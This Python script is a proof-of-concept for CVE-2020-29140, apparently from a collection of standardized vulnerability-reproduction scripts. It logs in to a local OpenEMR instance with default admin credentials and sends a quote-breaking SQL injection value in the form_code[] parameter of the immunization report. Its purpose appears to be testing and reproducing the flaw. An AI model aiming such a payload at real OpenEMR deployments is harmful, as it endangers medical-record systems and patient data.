#!/usr/bin/env python3
"""
[APP] OpenEMR 
[CVE] CVE-2020-29140 
[TYPE] SQL injection
[METHOD] POST
[CRASH_FIELDS] form_code[]
[TARGET_URL] http://localhost/openemr/interface/reports/immunization_report.php
[PARAMS] form_refresh=true&form_get_hl7=false&form_code%5B%5D=25&form_code%5B%5D=1')&form_from_date=2020-11-10&form_to_date=2020-11-17
OpenEMR SQL injection vulnerability that requires administrator authentication
First login to /interface/main/main_screen.php, then POST to /interface/reports/immunization_report.php
"""

import sys
import os

# Import standardized POC utilities
from utils import *

def main():
    # Extract metadata from this file's docstring
    metadata = get_poc_metadata_from_file(__file__)
    
    # CVE-2020-29140 specific configuration
    base_url = 'http://localhost/openemr'
    login_path = '/interface/main/main_screen.php?auth=login&site=default'
    
    # Login payload based on the provided configuration
    login_payload = {
        'new_login_session_management': '1',
        'authProvider': 'Default',
        'authUser': 'admin',
        'clearPass': 'pass',
        'languageChoice': '1'
    }
    
    # POC target URL and payload
    poc_url = 'http://localhost/openemr/interface/reports/immunization_report.php'
    poc_payload = {
        'form_refresh': 'true',
        'form_get_hl7': 'false',
        'form_code[]': "1'",  # SQL injection payload in array parameter
        'form_from_date': '2020-11-10',
        'form_to_date': '2020-11-17'
    }
    
    # Run authenticated POC test using the helper function
    exit_code = run_authenticated_poc(
        base_url=base_url,
        login_path=login_path,
        login_payload=login_payload,
        poc_url=poc_url,
        poc_payload=poc_payload,
        method=metadata['method'],
        cve_id=metadata['cve'],
        app_name=metadata['app'],
        vuln_type=metadata['type'],
    )
    
    sys.exit(exit_code)

if __name__ == '__main__':
    main()
